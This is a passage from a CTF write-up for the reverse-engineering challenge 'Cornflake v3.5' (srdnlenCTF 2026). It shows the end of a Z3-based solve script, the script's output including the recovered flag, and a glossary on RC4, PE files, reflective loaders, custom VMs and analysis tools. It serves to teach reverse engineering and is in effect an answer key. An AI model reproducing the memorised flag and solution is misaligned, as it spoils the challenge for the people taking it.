    for idx in range(FLAG_LEN):
        s.add(Implies(x[22] - 48 == idx, x[idx] == 114))
    s.add((x[22] + x[24]) == 100)
    s.add((x[25] + 2 * x[26] - 3 * x[27]) == 118)
    s.add((x[30] + x[31] + x[32]) == 217)

    for idx, val in {
        9: 51, 10: 118, 11: 95, 12: 99, 13: 52, 14: 78,
        15: 95, 16: 108, 17: 48, 18: 111, 19: 107, 20: 95,
        23: 75, 25: 95, 26: 109, 27: 65, 28: 108, 29: 119,
        30: 52, 31: 114, 32: 51
    }.items():
        s.add(x[idx] == val)

    assert s.check() == sat
    m = s.model()
    return "".join(chr(m[v].as_long()) for v in x)


# ── Main ──────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 56)
    print("  Cornflake v3.5 — srdnlenCTF 2026")
    print("=" * 56)
    print()
    stage1()
    print()
    print("[S2] Running Z3 VM constraint solver ...")
    flag = stage2()
    ok = vm_constraints_hold(flag)
    print(f"[S2] Verification : {'PASS' if ok else 'FAIL'}")
    print()
    print("=" * 56)
    print(f"  FLAG: {flag}")
    print("=" * 56)
```

Run it:

```bash
pip3 install z3-solver pefile
python3 solve.py
```

Output:
```
========================================================
  Cornflake v3.5 — srdnlenCTF 2026
========================================================

[S1] RC4 key    : s3cr3t_k3y_v1
[S1] Username   : super_powerful_admin
[S1] Session ID : 46f5289437bc009c17817e997ae82bfbd065545d

[S2] Running Z3 VM constraint solver ...
[S2] Verification : PASS

========================================================
  FLAG: srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}
========================================================
```

---

## Key Concepts Explained

### RC4 (Rivest Cipher 4)
A stream cipher from 1987. Takes a key and plaintext, produces ciphertext via
XOR with a keystream derived from the key. **Critically: it is symmetric** —
encrypting the ciphertext with the same key gives back the plaintext. This
means if you know the key and ciphertext, you always get plaintext for free.

### Hex encoding
Converts raw bytes to human-readable hex string.
`0x46 0xf5` → `"46f5"`. Not encryption — anyone can reverse it with
`bytes.fromhex()`.

### PE (Portable Executable)
The file format for all Windows `.exe` and `.dll` files. Always starts with
`MZ` (the designer's initials, Mark Zbikowski). Contains code sections,
data sections, a list of imported functions, relocation data, and more.

### Reflective PE Loader
A technique where a program loads another PE binary purely from memory,
without writing it to disk. Implements the Windows loader manually using
`VirtualAlloc`, `memcpy`, relocation fixing, and `LoadLibrary/GetProcAddress`.
Used by malware to evade antivirus.

### Custom VM (Virtual Machine)
A fake CPU implemented in software. Has its own instruction set (opcodes),
a stack for temporary values, and an interpreter loop that reads and executes
instructions one at a time. Used in CTFs and malware to obfuscate logic.

### Z3 SMT Solver
A constraint satisfaction engine. You describe variables and rules; Z3 finds
values satisfying all rules (or proves no solution exists). Essential tool for
CTF reverse engineering when the program checks inputs through complex
multi-variable equations.

### Static vs Dynamic Analysis

| Static Analysis | Dynamic Analysis |
|----------------|-----------------|
| Read binary without running | Run the binary and observe |
| Tools: Ghidra, strings, file, pefile | Tools: pwndbg, GDB, x64dbg, Frida |
| Safe — binary never executes | Requires sandbox/VM |
| Good for understanding logic | Good for confirming behavior |

---

## Tools Used

| Tool | Purpose | Install |
|------|---------|---------|
| `file` | Identify binary type | built-in |
| `strings` | Extract readable text | built-in |
| `pefile` | Parse PE structure | `pip3 install pefile` |
| Ghidra | Decompile + disassemble | ghidra.re |
| `pwndbg` | Enhanced GDB for dynamic analysis | github.com/pwndbg/pwndbg |
| `z3-solver` | Constraint solving | `pip3 install z3-solver` |

---

*Flag: `srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}`*
*"rev can look like malware"*
